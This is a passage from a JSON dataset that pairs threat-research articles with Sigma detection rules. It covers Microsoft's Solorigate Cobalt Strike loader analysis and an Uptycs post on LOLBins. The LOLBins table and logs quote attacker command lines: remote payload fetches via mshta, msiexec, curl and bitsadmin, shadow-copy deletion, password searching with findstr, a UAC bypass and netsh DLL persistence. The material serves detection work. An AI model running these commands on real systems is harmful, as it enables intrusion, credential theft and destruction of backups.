| |\n  | | +-------------+ | |\n  | | | Beacon      | | |\n  | | +-------------+ | |\n  | +-----------------+ |\n  +---------------------+\n```\n\n*Figure 8. Structure of Variant 2 custom Loader*\n\nThese custom loaders can be further divided into two types:\n\n- **Type A**: A set of large DLLs that decode and load the Cobalt Strike Reflective Loader from the DLL’s *DATA* section (detected as *Trojan:Win64/Solorigate.SC!dha* by Microsoft)\n- **Type B**: A set of smaller DLLs that de-obfuscate and load the Reflective Loader from the DLL’s *CODE* section (also referred to as Raindrop by Symantec, detected as *Trojan:Win64/Solorigate.SB!dha* by Microsoft)\n\n```image\nAlt: Two subtypes of the custom Loader\nDescription: The image illustrates the structure of two types of custom loaders used in Cobalt Strike: Type A and Type B (Raindrop). It visually represents the organization of each loader's CODE and DATA sections. Type A DLL is shown with the Cobalt Strike Reflective Loader located in the DATA section, while Type B DLL (Raindrop) has the Reflective Loader in the CODE section. Both loaders also contain a beacon icon, indicating their functionality in executing the Cobalt Strike Beacon.\nTranscription: |\n  Type A DLL                     Type B DLL (Raindrop)\n  ---------------------------------------------------\n  CODE Section                   CODE Section\n  ---------------------------------------------------\n                                 Cobalt Strike Reflective Loader\n                                 -------------------------------\n                                 Beacon\n  ---------------------------------------------------\n  DATA Section                   DATA Section\n  ---------------------------------------------------\n  Cobalt Strike Reflective Loader\n  -------------------------------\n  Beacon\n```\n\n*Figure 9. Two subtypes of the custom Loader*\n\nThe ultimate goal of both Type A and B loaders is to de-obfuscate and load a Cobalt Strike Reflective Loader in memory. Type A loaders use a simple rolling XOR methodology to decode the Reflective Loader, while Type B loaders (Raindrop) utilize a combination of the AES-256 encryption algorithm (unique key per sample), LZMA compression, and a single-byte XOR decoding routine to de-obfuscate the embedded Reflective Loader in memory. At the conclusion of the de-obfuscation process, both variants proceed to load the Reflective Loader in memory, which subsequently executes Cobalt Strike Beacon in memory.\n\n### Forensic observations about the Solorigate Cobalt Strike loaders\n\nMetadata and timeline analysis of the custom loaders, combined with analysis of the configuration data extracted from each Beacon payload, led to following discoveries:\n\n- The custom loader DLLs were introduced to compromised systems between the hours of 8:00 AM and 5:00 PM UTC. In one intrusion, the first second-stage custom loader (TEARDROP) was introduced to the environment by *BusinessLayerHost.exe* at around 10:00 AM UTC.\n- The custom loader DLLs dropped on disk carried compile timestamps ranging from July 2020 to October 2020, while the embedded Reflective DLLs carried compile timestamps ranging from March 2016 to November 2017. The presence of 2016-2017 compile timestamps is likely due to attackers’ usage of custom Malleable C2 profiles with synthetic compile timestamp (*compile_time*) values. At first glance it would appear as if the actor did not timestamp the compile time of the custom loader DLLs (2020 compile timestamps). However, forensic analysis of compromised systems revealed that in a few cases, the timestamp of the custom loader DLLs’ introduction to systems predated the compile timestamps of the custom loader DLLs (i.e., the DLLs appear to have been compiled at a future date).\n- Both Variant 1 and 2 custom loader DLLs were configured with PE version information that masquerades version information belonging to legitimate applications and files from Windows (e.g., *DLL*), 7-Zip (e.g., *7z.dll*), Far Manager (e.g., *Far.dll*), LibIntl (e.g., *libintl3.dll*), and other legitimate applications. The Variant 2 custom loaders were mostly compiled from open-source source code of legitimate applications, such as 7-Zip and Far Manager (i.e., the open-source source code for these applications was modified to add in the malicious code). In some instances, certain development artifacts were left behind in the custom loader samples. For example, the following C++ header (.hpp) path was observed in a loader compiled from a modified Far Manager open-source source code (*c:\\build\\workspace\\cobalt_cryptor_far (dev071)\\farmanager\\far\\platform.concurrency.hpp*):\n\n```image\nAlt: File path for a C++ header file\nDescription: The image is a hexadecimal dump showing the memory layout or binary content associated with a specific software or malware component. It includes a representation of the byte values on the left side and the corresponding ASCII characters on the right side. The highlighted sections in blue seem to indicate specific file paths or components related to a build process, likely connected to the analysis of the custom loaders mentioned in the context. This dump is likely used for forensic analysis or reverse engineering of the malware.\nTranscription: |\n  74 20 00 63 00 72 00 65 00 61 00 74 00 65 00 t.c.r.e.a.t.e.\n  2E 00 74 00 68 00 72 00 65 00 61 00 64 00 00 .t.h.r.e.a.d...\n  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n  2E 74 2E 62 2E 75 2E 69 2E 6C 2E 64 2E 00 00 .b.u.i.l.d......\n  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ..workspace.c....\n  77 6F 72 6B 73 70 61 63 65 2E 63 2E 6F 2E 00 .o.b.a.l........\n  62 2E 61 2E 6C 2E 00 00 00 00 00 00 00 00 00 .t.c.r.y.p.t.o..\n  74 2E 63 2E 72 2E 79 2E 70 2E 74 2E 00 00 00 ...f.a.t........\n  6F 2E 00 00 00 00 00 00 00 00 00 00 00 00 00 .o.r.m.a.t......\n  66 74 2E 63 2E 72 2E 79 2E 70 2E 74 2E 00 00 ...c.o.n.c.u.r.r\n  65 2E 72 2E 74 2E 00 00 00 00 00 00 00 00 00 c.y...h.p.p.....\n  61 00 64 00 6D 00 69 00 6E 00 00 00 00 00 00 .e.n.c.y........\n  74 72 65 61 64 3A 73 74 61 72 74 65 72 00 00 :thread::starter\n```\n\n*Figure 10. File path for a C++ header file (.hpp) observed in custom Cobalt Strike loader samples*\n\n- Each custom loader DLL contains a designated PE export function that either triggers the malicious functionality of the loader (in Variant 1) or calls the *Sleep()* function (Variant 2). A non-comprehensive list of these PE export function names (one per loader DLL) is included below (note the repeating *“Tk”* prefix in the export names that can be a useful indicator for hunting purposes):\n\n| Export Function Names  |\n| ---------------------- |\n| __GetClasterInf        |\n| FreeSetupRevoke        |\n| Tk_GetRootCoords       |\n| TkComputeAnchor        |\n| TkpSetMainMenubar      |\n| __RtlProjectObj        |\n| GetLimitStroke         |\n| Tk_IntersectTextLayout |\n| TkDebugBorder          |\n| TkSelPropProc          |\n| __TkGlobal             |\n| NetSetupServiceMain    |\n| Tk_NameOf3DBorder      |\n| TkFindStateString      |\n| TkWinCancelMouseTimer  |\n| _XInitImageFuncPtrs    |\n| RestVirtAlloc          |\n| Tk_PostscriptImage     |\n| TkGetDefaultScreenName |\n| TkWinClipboardRender   |\n| CreateLocalThread      |\n| SetTkPrv               |\n| Tk_QueryAllocMem       |\n| TkGrabState            |\n| XClearWindow           |\n| CreateProcessTVI       |\n| Tk_GetElementBox       |\n| Tk_SizeOfImage         |\n| TkpSetKeycodeAndState  |\n| XCreateBitmapFromData  |\n\n- In addition to the attackers dropping the custom loaders in unique locations on each system during the lateral movement phase, most Beacon and Reflective Loader instances discovered during our investigation were configured with a unique C2 domain name, unique Watermark ID, unique PE compile timestamp, PE Original Name (), DNS Idle IP (e.g., *84[.]200[.]70[.]40*, *208[.]67[.]220[.]220*, *208[.]67[.]222[.]222*, *9[.]9[.]9[.]9*, and *8[.]8[.]4[.]4*), unique User-Agent and HTTP POST/GET transaction URI, sleep time, and jitter factor. This is notable since no two Beacon instances shared the same C2 domain name, Watermark, or other aforementioned configuration values. Other than certain internal fields, most Beacon configuration fields are customizable via a Malleable C2 profile. If the actor did indeed use custom Malleable C2 profiles, as evidenced in the list above, the profiles varied greatly for Beacon instances used during different lateral movement campaigns within the same network. As mentioned above, each Beacon instance carries a unique Watermark value. Analysis of the Watermark values revealed that all Watermark values start with the number ‘3’, for example:\n\n| Watermark Values |\n| ---------------- |\n| 0x*3*0343131     |\n| 0x*3*4353633     |\n| 0x*3*8303535     |\n| 0x*3*8383238     |\n| 0x*3*2323638     |\n| 0x*3*5373331     |\n| 0x*3*8353138     |\n| 0x*3*8383430     |\n\n- As for post-exploitation artifacts, the observed Beacon instances were configured to use different “spawnto” values, which Cobalt Strike uses to spawn a temporary process and inject its post-exploitation-related components or features into the spawned process. This detail could be valuable for hunting process creation events originated by *exe*. Below are some example paths used by the observed Beacon instances:\n\n  - *%WINDIR%\\System32\\conhost.exe*\n  - *%WINDIR%\\System32\\control.exe*\n  - *%WINDIR%\\System32\\dllhost.exe*\n  - *%WINDIR%\\System32\\help.exe*\n  - *%WINDIR%\\System32\\LogonUI.exe*\n  - *%WINDIR%\\System32\\msiexec.exe*\n  - *%WINDIR%\\System32\\print.exe*\n  - *%WINDIR%\\SysWOW64\\audiodg.exe*\n  - *%WINDIR%\\SysWOW64\\help.exe*\n  - *%WINDIR%\\SysWOW64\\msiexec.exe*\n  - *%WINDIR%\\SysWOW64\\msinfo32.exe*\n  - *%WINDIR%\\SysWOW64\\print.exe*\n  - *%WINDIR%\\SysWOW64\\WerFault.exe*\n\n## Additional attacker tactics, anti-forensic behavior, and operational security\n\nAs mentioned, the attackers behind Solorigate are skillful and methodic operators who follow operations security (OpSec) best practices to minimize traces, stay under the radar, and avoid detection.\n\nDuring our in-depth analysis of the attacker’s tactics, techniques, and procedures (TTPs) seen through the lens of Microsoft 365 Defender’s rich telemetry, we observed a few techniques that are worth disclosing to help other defenders better respond to this incident and use hunting tools like Microsoft 365 Defender advanced hunting or Azure Sentinel queries to search for potential traces of past activity.\n\nSome examples of why these attackers stand out for their professional OpSec methodology and anti-forensic behavior are listed below:\n\n- Methodic avoidance of shared indicators for each compromised host. As discussed in the previous section, each Cobalt Strike DLL implant was prepared to be unique per machine and avoided at any cost overlap and reuse of folder name, file name, export function names, C2 domain/IP, HTTP requests, timestamp, file metadata, config, and child process launched. This extreme level of variance was also applied to non-executable entities, such as WMI persistence filter name, WMI filter query, passwords used for 7-zip archives, and names of output log files. Applying this level of permutations for each individual compromised machine is an incredible effort normally not seen with other adversaries and done to prevent full identification of all compromised assets inside a network or effective sharing of threat intel between victims.\n- Camouflage and blending into the environment. Tools and binaries used by the attackers (e.g., ADFIND legit tool) were always renamed and placed in folders that mimicked existing programs and files already present on a machine. This blending was not just used for files, but for other elements. For example, W",
    "sigma_rule": {
      "title": "Audit Policy Tampering Via Auditpol",
      "id": "0a13e132-651d-11eb-ae93-0242ac130002",
      "related": [
        {
          "id": "c6c56ada-612b-42d1-9a29-adad3c5c2c1e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Threat actors can use auditpol binary to change audit policy configuration to impair detection capability.\nThis can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\n",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/"
      ],
      "author": "Janantha Marasinghe (https://github.com/blueteam0ps)",
      "date": "2021-02-02",
      "modified": "2023-02-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\auditpol.exe"
          },
          {
            "OriginalFileName": "AUDITPOL.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "disable",
            "clear",
            "remove",
            "restore"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrator or administrator scripts might leverage the flags mentioned in the detection section. Either way, it should always be monitored"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_auditpol_susp_execution.yml"
  },
  "10": {
    "url": "https://www.uptycs.com/blog/lolbins-are-no-laughing-matter",
    "markdown": "# LOLBins: Understanding the Silent Operations of Attackers\n\n**September 01, 2021**\n\n**Tags:** \nCloud Security, Threats\n\nThe Uptycs Threat Research team has observed several malicious binaries in our threat intelligence systems using LOLBins in their attack kill chain. LOLBins (short form for Living Off the Land Binaries), are non-malicious native operating system or known software binaries used for performing malicious activities and evading cyber defenses.\n\nThe Uptycs Threat research team has created over 300 rules covering different techniques used by LOLBins in the MITRE ATT&CK framework.\n\nIn this post, we’ll take a look at the LOLBins used by the attackers and how you can use Uptycs EDR detection capabilities to find if these have been used in your environment.\n\nClick here to see the LOLBins MITRE map\n\n## LOLBins & Uptycs EDR Coverage\n\nLiving off the Land binaries exploit the trusted utilities for achieving malicious objectives. They are mostly used by threat actors to stay under the radar and continue malicious activities undetected. In Windows, most of the malware families are taking leverage of LOLBins for a wide variety of phases in the attack kill chain.\n\nUptycs EDR has a robust coverage for all LOLBAS (Living off the Land Binaries and Scripts) techniques in the wild. Using the data from our customer telemetry and threat intelligence systems, the Uptycs Threat research team has created over 300 rules covering 8 different tactics used by LOLBins in the MITRE ATT&CK framework. The distribution of these rules with the techniques is shown below (see Figure 1).\n\n```image\nAlt: Figure1\nDescription: The image is a pie chart representing the distribution of rules created by the Uptycs Threat research team covering various tactics used by Living off the Land binaries (LOLBins) according to the MITRE ATT&CK framework. The chart includes segments labeled with different tactics: Defense Evasion (32.6%), Execution (20.8%), Discovery (13.7%), Persistence (10.9%), Credential Access (7.0%), Command and (6.1%), Lateral Movement (3.8%), and Collection (1.6%). Each segment is color-coded and indicates the percentage of rules associated with each tactic.\nTranscription: |\n  Collection: 1.6%\n  Persistence: 10.9%\n  Credential Access: 7.0%\n  Lateral Movement: 3.8%\n  Command and Control: 6.1%\n  Execution: 20.8%\n  Discovery: 13.7%\n  Defense Evasion: 32.6%\n```\n\n## April - July 2021 LOLBins & MITRE ATT&CK Mapping\n\nUsing the data from our in-house threat intelligence systems and customer telemetry, we created a monitoring dashboard of all observed LOLBins. From April 2021 through July 2021, we have observed 26 binaries mostly used as LOLBins by several malware groups. The prevalence of the malicious binaries using the LOLBins is shown below (see Figure 2).\n\n```image\nAlt: Figure2\nDescription: The image is a bar chart that displays the prevalence of various Windows executables identified as LOLBins (Living Off the Land Binaries) used by attackers from April to July 2021. The x-axis lists the executables, while the y-axis shows the count of occurrences. The chart highlights the significant usage of 'regsvr32.exe' and 'rundll32.exe', showing counts of 32,732 and 15,864 respectively, followed by other executables like 'EQNEDT32.exe', 'cmd.exe', and 'powershell.exe' with lower counts. This visual representation serves to illustrate the distribution of these binaries in malicious activities.\nTranscription: |\n  Executables         Count\n  regsvr32.exe        32732\n  rundll32.exe        15864\n  EQNEDT32.EXE        7246\n  cmd.exe             3091\n  powershell.exe      2713\n  atbroker.exe        840\n  wmi.exe             450\n  schtasks.exe        298\n  nash.exe            93\n  chrome.exe          81\n  vssadmin.exe        67\n  net.exe             55\n  msha.exe            48\n  cscript.exe         50\n  curl.exe            35\n  certutil.exe        25\n  wscript.exe         24\n  msiexec.exe         18\n  csc.exe             14\n  reg.exe             4\n  findstr.exe         4\n  bthadmin.exe        4\n  taskkill.exe        4\n  whoami              3\n  tasklist.exe        3\n  verclsid.exe        2\n```\n\nThese LOLBins were identified to be exclusively used in the Defense Evasion and Execution phase of the MITRE ATT&CK framework. The distribution of the different ATT&CK tactics used by the attackers leveraging Windows utilities from April 2021 through July 2021 is shown below (see Figure 3).\n\n```image\nAlt: Figure3\nDescription: The image is a pie chart illustrating the distribution of different MITRE ATT&CK tactics used by attackers leveraging LOLBins from April to July 2021. The chart highlights six tactics: Defense Evasion (34.6%), Execution (26.9%), and others like Discovery, Credential Access, Impact, Command and Control, Persistence, and Privilege Escalation, each accounting for 3.8% to 7.7% of the total. Each segment is color-coded and labeled with corresponding percentages.\nTranscription: |\n  Defense Evasion: 34.6%\n  Execution: 26.9%\n  Discovery: 7.7%\n  Credential Access: 7.7%\n  Impact: 7.7%\n  Command and Control: 7.7%\n  Persistence: 3.8%\n  Privilege Escalation: 3.8%\n```\n\n<a id=\"MITREMapLOLBin\"></a>\n\nThe table below describes these 26 LOLbins, along with their MITRE ATT&CK mapping and a command line example.\n\n| LOLBin         | MITRE ID | MITRE Tactic         | Description                                                                 | Command Line Example                                         |\n| -------------- | -------- | -------------------- | --------------------------------------------------------------------------- | ------------------------------------------------------------ |\n| regsvr32.exe   | T1218    | Defense Evasion      | Adversaries may use regsvr32.exe to execute malicious DLLs.                 | `regsvr32 ..\\Kro.fis2`                                       |\n| rundll32.exe   | T1218    | Defense Evasion      | Adversaries may use rundll32.exe to load malicious DLLs.                    | `rundll32 ..\\Kiod.hod2,DllRegisterServer`                    |\n| EQNEDT32.exe   | T1203    | Execution            | Adversaries may exploit CVE-2017-11882 vulnerability in eqnedt32 for RCE.   | `EQNEDT32.EXE -Embedding`                                    |\n| Cmd.exe        | T0159    | Execution            | Adversaries may use cmd.exe to launch other Windows utilities for attacks.  | `cmd.exe /c reg add HKCU\\<Reg Key Path> /d 1q1a1z.bat /f`    |\n| powershell.exe | T1059    | Execution            | Adversaries may use powershell.exe to download payloads or execute scripts. | `PowerShell -c (New-Object System.Net.WebClient)...`         |\n| attrib.exe     | T1564    | Defense Evasion      | Adversaries may use attrib.exe to hide files for defense evasion.           | `\"C:\\Windows\\system32\\attrib.exe\" +h C:\\Users\\admin\\...`     |\n| wmic           | T1047    | Execution            | Adversaries may use wmic for execution or lateral movement.                 | `wmic process call create \"rundll32.exe C:\\ProgramData...`   |\n| schtasks.exe   | T1053    | Privilege Escalation | Adversaries may abuse schtasks.exe to initiate execution of malicious code. | `schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup...`        |\n| netsh          | T1546    | Persistence          | Adversaries may use netsh to gain persistence by executing helper DLL.      | `netsh add helper C:/Users/Public/settingsync.dll`           |\n| Chrome.exe     | T1105    | Command and Control  | Adversaries can spawn chrome.exe to download malicious files.               | `cmd /k start chrome https://onedrive.live.com/embed?...`    |\n| vssadmin.exe   | T1490    | Impact               | Adversaries may use vssadmin.exe to delete volume shadow copies.            | `vssadmin.exe delete shadows /all /quiet`                    |\n| net.exe        | T1562    | Defense Evasion      | Adversaries can use net.exe to stop services on the target system.          | `C:\\Windows\\system32\\net.exe stop \"samss\" /y`                |\n| mshta.exe      | T1218    | Defense Evasion      | Adversaries may abuse mshta.exe to proxy execution of malicious .hta files. | `mshta https://median-researchers.000webhostapp.com/cmd.hta` |\n| cscript.exe    | T1059    | Execution            | Adversaries may use cscript.exe to execute VB Scripts.                      | `\"C:\\Windows\\System32\\cscript.exe\" //NOLOGO \".\\XMCO_Snap...` |\n| curl.exe       | T1105    | Command and Control  | Adversaries may use curl.exe to download tools and payloads.                | `curl.exe -o C:\\ctf\\file.exe https://dforest.watch...`       |\n| certutil.exe   | T1140    | Defense Evasion      | Adversaries may use certutil.exe to encode/decode payloads.                 | `certutil -decode C:\\ProgramData\\googlelog.txt C:\\...`       |\n| wscript.exe    | T1059    | Execution            | Adversaries may use wscript.exe to execute VBA, VBS, JS files.              | `WScript.exe\" \"C:\\Users\\user\\Desktop\\2.vbs\"`                 |\n| msiexec.exe    | T1218    | Defense Evasion      | Adversaries may use msiexec.exe to silently launch malicious MSI files.     | `msiExec /i http://hotelcontinental-khenifra.com/ffp...`     |\n| csc.exe        | T1027    | Defense Evasion      | Adversaries may use csc.exe to compile executables from downloaded C# code. | `\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\...`       |\n| reg.exe        | T1112    | Defense Evasion      | Adversaries may use reg.exe to query, add or modify Windows registry.       | `REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion...` |\n| findstr.exe    | T1552    | Credential Access    | Adversaries may search for unsecured credentials using findstr.exe.         | `findstr /spin \"password\" *.*`                               |\n| bitsadmin.exe  | T1197    | Defense Evasion      | Adversaries may abuse bitsadmin to download malicious code.                 | `bitsadmin.exe /transfer McbDBJxc https://jrsawesome...`     |\n| taskkill.exe   | T1489    | Impact               | Adversaries may use taskkill.exe to kill processes or stop services.        | `taskkill /im explorer.exe /f`                               |\n| whoami.exe     | T1033    | Discovery            | Adversaries may try to find current logged in user using whoami.exe.        | `cmd.exe /c whoami.exe /PRIV > file.txt`                     |\n| tasklist.exe   | T1057    | Discovery            | Adversaries may use tasklist.exe to enumerate running processes.            | `tasklist /nh /fi \"imagename eq svhost.exe\"`                 |\n| verclsid.exe   | T1218    | Execution            | Adversaries may abuse verclsid.exe to execute malicious COM payloads.       | `verclsid.exe /S /C {E88DCCE0-B7B3-11D1-A9F0-00AA...`        |\n\n## LOLBins Observations\n\nBased on the data we obtained from April 2021 through July 2021, we identified the following:\n\n- Most of the LOLBin alerts we have identified have been triggered via decoy macro documents.\n- **regsvr32.exe** and **rundll32.exe** have the highest number of counts as these utilities were used exclusively by Qbot and IcedID malwares from the beginning of January 2021, as detailed in our previous blog.\n- We have also seen a significant number of Loki and Agent Tesla malware samples exploiting a Microsoft Equation Editor (EE) vulnerability in the EQNEDT32.\n\nWe will now cover interesting examples of LOLBins and their corresponding MITRE ATT&CK tactics.\n\n## LOLBin - Chrome.exe\n\n**Tactic: Command & Control** \n*Hash: eae1b54ba4168e16e951fde291520078d8a5f8b98447cedf5663ae62b9069127*\n\nChrome is the most commonly used browser by most users even though it is not a default Windows utility. During June 2021, our threat intelligence systems detected a document “Resume.docx” which spawned a new process of chrome.exe via command line. This activity often goes unnoticed by monitoring solutions.\n\nThe document used chrome.exe to create a new window via command line argument `--new-window` to download the payload from onedrive.com as shown below (see Figure 4).\n\n```image\nAlt: Figure4-1\nDescription: The image is a screenshot of a process monitoring tool displaying a list of processes with details about their creation events. It highlights the processes 'cmd.exe' and 'chrome.exe', showing their Parent Process ID (PID), command line arguments, and the file paths. The command line for 'chrome.exe' includes the argument '--new-window' followed by a URL from onedrive.com, indicating that a document (Resume.docx) was used to execute this process. This visual data is relevant to understanding the manipulation of commonly used applications in cyber attacks.\nTranscription: |\n  WINWORD.EXE       2304   Process Create   C:\\windows\\system32\\cmd.exe\n  cmd.exe           2360   Process Start\n  cmd.exe           2360   Process Create   C:\\Windows\\System32\\Conhost.exe\n  Conhost.exe      11728   Process Start\n  cmd.exe           2360   Process Create   C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n  chrome.exe       10040   Process Start\n  chrome.exe       10040   Process Start\n  chrome.exe       10040   Process Start\n  chrome.exe       10040   Process Start\n  chrome.exe       10040   Process Start\n  chrome.exe       10040   Process Start\n  chrome.exe        4436   Process Start\n  chrome.exe        4436   Process Start\n  chrome.exe        7228   Process Start\n  \n  Event Properties\n  \n  Event\n  Date & Time:  23-07-2021 13:14:19.8995677\n  Thread:       10836\n  Class:        Process\n  Operation:    Process Start\n  Result:       SUCCESS\n  Path:         \n  Duration:     0.0000000\n  \n  Parent PID:   2360\n  Command line: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --new-window https://onedrive.live.com/embed?cid=880174EF88F116A9\n```\n\n## LOLBin - Schtasks.exe\n\n**Tactic: Privilege Escalation** \n*Hash: 6c92ed33934d5a604f57aac4ff33252720354285291791bed88b6f3f15b9631d*\n\nSchtasks is used to create scheduled tasks which can be executed from time to time recurrently. We identified a document using schtasks for privilege escalation.\n\nThe Excel document we identified launches schtasks via command line to run the existing task named as SilentCleanup. This action is performed to bypass UAC and execute powershell commands in elevated mode as shown below (see Figure 5).\n\n```image\nAlt: Figure5-1\nDescription: The image displays a series of event logs related to the execution of processes on a Windows operating system. It highlights the execution of 'Excel.exe' and 'schtasks.exe,' with the command line associated with 'schtasks' specifically indicated. The command line shows the execution of a scheduled task named 'SilentCleanup,' which is relevant for privilege escalation techniques discussed in the provided context.\nTranscription: |\n  EXCEL.EXE         6428   Process Create   C:\\Windows\\System32\\cmd.exe\n  cmd.exe            224   Process Start    C:\\Windows\\System32\\Conhost.exe\n  cmd.exe            224   Process Create   C:\\Windows\\system32\\schtasks.exe\n  schtasks.exe      8832   Process Start\n  \n  Event Properties\n  Event    Process    Stack\n  \n  Date:    22-07-2021 14:01:59.8664141\n  Thread:  3456\n  Class:   Process\n  Operation: Process Start\n  Result:  SUCCESS\n  Path:    \n  Duration: 0.0000000\n  \n  Parent PID:   224\n  Command line: schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n  Current directory: C:\\Users\\lambtao\\Documents\\\n  Environment:\n```\n\n## LOLBin - Csc.exe\n\n**Tactic: Defense Evasion** \n*Hash: 2048aae014930d195ac0c139c3260928bd25d840ff924fb46d25c79048a9c813*\n\nCsc.exe is an inbuilt utility located in the Microsoft.NET\\Framework\\<Version> folder under the Windows directory. The main purpose of this utility is to compile C# code. As the malicious code isn't compiled, the adversaries may be able to bypass the detection and analysis as it can also be named as legitimate looking documents.\n\nWe identified a word document named “contract.docm”, which launches powershell to download the uncompiled C# code. After download is complete, csc.exe compiles the same executable code on the fly as shown below (see Figure 6).\n\n```image\nAlt: Figure6\nDescription: The image displays a log of process events related to the execution of the Csc.exe utility. It details multiple process activities, such as the starting and exiting of various processes including WINWORD.EXE and powershell.exe. The highlighted section includes information about the Csc.exe process, including the command line used to execute it, the parent process ID, and the current directory from which it was run. This information is relevant for understanding how attackers can use Csc.exe as a LOLBin (Living Off the Land Binary) to execute malicious code.\nTranscription: |\n  13:58:...   WINWORD.EXE     7768    Process Exit            SUCCESS\n  13:58:...   WINWORD.EXE     7412    Process Create  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe    SUCCESS\n  13:58:...   powershell.exe  10776   Process Start           SUCCESS\n  13:58:...   DllHost.exe     9500    Process Create  C:\\Windows\\System32\\conhost.exe    SUCCESS\n  13:58:...   conhost.exe     9500    Process Start           SUCCESS\n  13:58:...   powershell.exe  10776   Process Create  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe    SUCCESS\n  13:58:...   csc.exe         11184   Process Start           SUCCESS\n  13:58:...   powershell.exe  10776   Process Create  C:\\Windows\\SysWOW64\\DllHost.exe    SUCCESS\n  13:58:...   DllHost.exe     8380    Process Start           SUCCESS\n  13:58:...   svchost.exe     8300    Process Create  C:\\Windows\\SysWOW64\\DllHost.exe    SUCCESS\n  13:58:...   svchost.exe     8300    Process Start           SUCCESS\n  13:58:...   DllHost.exe     7668    Process Create  C:\\Program Files (x86)\\Notepad++\\notepad++.exe    SUCCESS\n  13:58:...   Explorer.EXE    7668    Process Start           SUCCESS\n  13:58:...   notepad++.exe   7668    Process Start           SUCCESS\n  \n  Event: Process Start\n  Date: 08-07-2021 13:58:15.2665627\n  Thread: 11184\n  Class: Process\n  Operation: Process Start\n  Result: SUCCESS\n  Path: \n  Duration: 0.0000000\n  \n  Parent PID: 10776\n  Command line: \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\" /noconfig /fullpaths @\"C:\\Users\\Lunatic0x0\\AppData\\Local\\Temp\\2dv0x0yh.cmdline\"\n  Current directory: C:\\Users\\Lunatic0x0\\Documents\\\n  Environment: \n      allusersprofile=C:\\ProgramData\n```\n\n## LOLBin - netsh.exe\n\n**Tactic: Persistence** \n*Hash: 36b891924e7259d7b517a5f16a108e63aca927da3610b1dcb4dee79a4ccd2223*\n\nNetsh is a command-line scripting utility that allows you to display or modify the network configuration. Netsh also has an option to add helper DLLs to extend functionality of the utility.\n\nWe identified an excel document that called wmic to create a new process of netsh to register the malicious DLL as the helper DLL as shown below (see Figure 8).\n\n```image\nAlt: Figure8\nDescription: The image is a screenshot of a process execution log, detailing the sequence of events related to the execution of the netsh.exe utility. It shows the processes involved, including EXCEL.EXE, wmic.exe, and various system processes, all marked with 'SUCCESS' to indicate successful execution. The Event Properties section highlights the command line used to add a helper DLL to netsh, specifically 'netsh add helper C:\\Users\\Public\\settingsync.dll', indicating a method of persistence utilized by attackers.\nTranscription: |\n  EXCEL.EXE       11832   Process Create   C:\\Windows\\System32\\Wbem\\wmic.exe                SUCCESS\n  wmic.exe        9564    Process Start    C:\\Windows\\System32\\Wbem\\wmic.exe                SUCCESS\n  wmic.exe        9564    Process Create   C:\\Windows\\System32\\Conhost.exe                  SUCCESS\n  Conhost.exe     9564    Process Start    C:\\Windows\\System32\\Conhost.exe                  SUCCESS\n  \n  EXCEL.EXE       11832   Process Create   C:\\Windows\\SYSTEM32\\regsvr32.exe                 SUCCESS\n  regsvr32.exe    7432    Process Start    C:\\Windows\\SYSTEM32\\regsvr32.exe                 SUCCESS\n  regsvr32.exe    7432    Process Exit     C:\\Windows\\system32\\netsh.exe                    SUCCESS\n  winrshost.exe   10520   Process Create   C:\\Windows\\system32\\netsh.exe                    SUCCESS\n  netsh.exe       10520   Process Start    C:\\Windows\\system32\\netsh.exe                    SUCCESS\n  netsh.exe       10520   Process Create   C:\\Windows\\System32\\Conhost.exe                  SUCCESS\n  Conhost.exe     10520   Process Start    C:\\Windows\\System32\\Conhost.exe                  SUCCESS\n  \n  Event Properties\n  Event\n  Date:            28-07-2021 20:10:44.7517743\n  Thread:          880\n  Class:           Process\n  Operation:       Process Start\n  Result:          SUCCESS\n  Path:\n  Duration:        0.0000000\n  \n  Command line:    netsh add helper C:/Users/Public/settingsync.dll\n```\n\nThe path of the DLL is also entered into Windows Registry at `HKLM\\SOFTWARE\\Microsoft\\Netsh`. This allows adversaries to maintain persistence and the execution of the DLL would take place whenever netsh is launched.\n\n## Conclusion\n\nThe Uptycs Threat Research team continues to see an increase in the LOLBins used in various stages of the MITRE ATT&CK framework. As most of these utilities are often used for daily activities, it becomes a challenge for traditional security solutions that do not monitor process behavior.\n\nUptycs’ EDR functionality with suspicious parent/child process relationships, correlation and Threat intelligence provides comprehensive detection and visibility to identify and detect LOLBins malicious activity generically.",
    "sigma_rule": {
      "title": "Hiding Files with Attrib.exe",
      "id": "4281cb20-2994-4580-aa63-c8b86d019934",
      "status": "test",
      "description": "Detects usage of attrib.exe to hide files from users.",
      "references": [
        "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/",
        "https://www.uptycs.com/blog/lolbins-are-no-laughing-matter"
      ],
      "author": "Sami Ruohonen",
      "date": "2019-01-16",
      "modified": "2023-03-14",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\attrib.exe"
          },
          {
            "OriginalFileName": "ATTRIB.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " +h "
        },
        "filter_main_msiexec": {
